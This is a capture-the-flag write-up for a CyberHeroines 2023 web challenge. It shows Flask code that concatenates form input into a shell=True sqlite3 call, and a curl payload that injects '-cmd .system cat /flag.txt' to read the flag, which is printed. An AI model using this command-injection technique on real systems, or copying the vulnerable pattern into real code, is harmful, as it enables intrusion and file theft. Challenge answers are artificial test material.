# CyberHeroines 2023

## Shafrira Goldwasser

> [Shafrira Goldwasser](https://en.wikipedia.org/wiki/Shafi_Goldwasser) (Hebrew: שפרירה גולדווסר; born 1959) is an Israeli-American computer scientist and winner of the Turing Award in 2012. She is the RSA Professor of Electrical Engineering and Computer Science at Massachusetts Institute of Technology; a professor of mathematical sciences at the Weizmann Institute of Science, Israel; the director of the Simons Institute for the Theory of Computing at the University of California, Berkeley; and co-founder and chief scientist of Duality Technologies.
> 
> Chal: I asked ChatGPT to make this [webapp](https://cyberheroines-web-srv4.chals.io/) but I couldnt prove it was secure. In honor of [this Turing Award winner](https://www.youtube.com/watch?v=DfJ8W49R0rI), prove it is insecure by returning the flag.
>
>  Author: [TJ](https://www.tjoconnor.org/)
>
> [`webapp.zip`](webapp.zip)

Tags: _web_

## Solution
We get a small webapp with source code. Inspecting the source code we find:

```python
from flask import Flask, render_template, request
import sqlite3
import subprocess

app = Flask(__name__)

# Database connection
#DATABASE = "database.db"

def query_database(name):
    query = 'sqlite3 database.db "SELECT biography FROM cyberheroines WHERE name=\'' + str(name) +'\'\"'
    result = subprocess.check_output(query, shell=True, text=True)
    return result


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        selected_name = request.form.get("heroine_name")
        biography = query_database(selected_name)
        return render_template("index.html", biography=biography)
    return render_template("index.html", biography="")

if __name__ == "__main__":
    app.run(debug=False,host='0.0.0.0')
```

The function `query_database` does a basic query to a sqlite3 database. At the first glance this looks vulnerable to `SQLI` and it is. I enumerated the database but didn't find anything until I noticed that the flag is present as file in the delivery.

And even more important, the query is not done via a `api` but by creating a `process` and calling `sqlite3` directly. So this looks more like command injection again than `sqli`.

After some research if found that `sqlite3` allows to call shell commands by using `.shell` parameter. And better yet, we can specify commands to be run with the `-cmd` commandline argument. After some trial and error I found this working payload `"heroine_name='\" -cmd \".system cat /flag.txt'"`.

```
curl -X POST http://ec2-3-144-228-78.us-east-2.compute.amazonaws.com:6264/ -d "heroine_name='\" -cmd \".system cat /flag.txt'"
...
<div class="biography">
            <h2>Biography:</h2>
            <p>chctf{CH4ng3d_h0w_w3_th1Nk_of_pr00f$}
</p>
        </div>
...
```

Flag `chctf{CH4ng3d_h0w_w3_th1Nk_of_pr00f$}`